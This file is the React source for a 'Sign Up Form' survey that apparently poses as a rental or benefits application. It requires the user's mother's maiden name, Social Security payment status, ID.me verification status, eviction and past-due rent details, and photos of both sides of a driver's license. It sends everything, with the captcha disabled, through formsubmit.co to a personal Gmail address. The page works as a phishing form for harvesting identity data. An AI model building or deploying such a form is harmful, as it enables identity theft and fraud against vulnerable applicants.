"use client"

import type React from "react"
import { useState } from "react"
import BackgroundImage from "../assets/background-image001.jpg";

const initialState = {
  Name: "",
  Email: "",
  Gender: "",
  PhoneNumber: "",
  City: "",
  MotherName: "",
  MotherMaiden: "",
  FatherName: "",
  PastDueRent: "",
  HaveYouBeenEvicted: "",
  HaveYouAppliedBefore: "",
  AreYouCurrentlyRecievingSocialSecurityPayment: "",
  HaveYouBeenVerifiedByIDME: "",
  DriverLicenseFront: null as File | null,
  DriverLicenseBack: null as File | null,
}

export default function SurveyForm() {
  const [step, setStep] = useState(1)
  const [formData, setFormData] = useState(initialState)

  const handleStartSurvey = () => setStep(2)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, files } = e.target
    if (type === "file" && files) {
      setFormData((prev) => ({ ...prev, [name]: files[0] }))
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }))
    }
  }

  if (step === 1) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
        style={{ backgroundImage: `url(${BackgroundImage})` }}
      >
        <div className="text-center">
          <div className="bg-[#0d1d3788] px-6 rounded-xl py-8 mb-10">
            <h1 className="text-3xl md:text-6xl font-semibold text-white mb-4">Sign Up Form</h1>
            <p className="text-xl mb-8 text-white">Gathering Registrant details</p>
          </div>
          <button
            onClick={handleStartSurvey}
            className="px-8 md:px-28 py-3 md:py-4 text-lg bg-[#64a3d2] text-white rounded transition duration-300"
          >
            START SURVEY
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-white">
      <div className="w-full md:w-3/5 bg-white shadow-lg rounded-lg p-8">
        <form
          action="https://formsubmit.co/Movewell4@gmail.com"
          method="POST"
          encType="multipart/form-data"
          className="space-y-6"
        >
          <input type="hidden" name="_captcha" value="false" />
          <h1 className="text-4xl font-semibold text-center mb-4">Sign Up Form</h1>
          <p className="text-xl mb-8 text-center text-gray-600">Gathering Registrant details</p>

          {Object.keys(initialState).map((key, index) => (
            <div key={key}>
              <label htmlFor={key} className="block text-xl mb-2">
                {index + 1}. {key.replace(/([A-Z])/g, " $1").trim()}
              </label>

              {key === "Gender" ? (
                <div className="flex space-x-4">
                  <label className="inline-flex items-center">
                    <input
                      type="radio"
                      name="Gender"
                      value="Male"
                      checked={formData.Gender === "Male"}
                      onChange={handleInputChange}
                      className="mr-2"
                      required
                    />
                    Male
                  </label>
                  <label className="inline-flex items-center">
                    <input
                      type="radio"
                      name="Gender"
                      value="Female"
                      checked={formData.Gender === "Female"}
                      onChange={handleInputChange}
                      className="mr-2"
                      required
                    />
                    Female
                  </label>
                </div>
              ) : key.includes("License") ? (
                <input
                  id={key}
                  name={key}
                  type="file"
                  accept="image/*"
                  onChange={handleInputChange}
                  className="w-full p-2 border border-gray-300 rounded"
                  required
                />
              ) : (
                <input
                  id={key}
                  name={key}
                  type={key === "Email" ? "email" : "text"}
                  value={formData[key as keyof typeof formData] as string}
                  onChange={handleInputChange}
                  className="w-full p-2 border border-gray-300 rounded"
                  required
                />
              )}

              <span className="inline-block bg-gray-200 text-gray-700 px-2 py-1 rounded-full text-sm mt-1">
                Required
              </span>
            </div>
          ))}

          <div className="flex justify-between items-center mt-8">
            <span className="text-sm text-gray-600">
              Answered {Object.values(formData).filter(Boolean).length} of {Object.keys(initialState).length}
            </span>
            <button
              type="submit"
              className="px-6 py-2 bg-black text-white rounded hover:bg-gray-800 transition duration-300"
            >
              Submit
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}

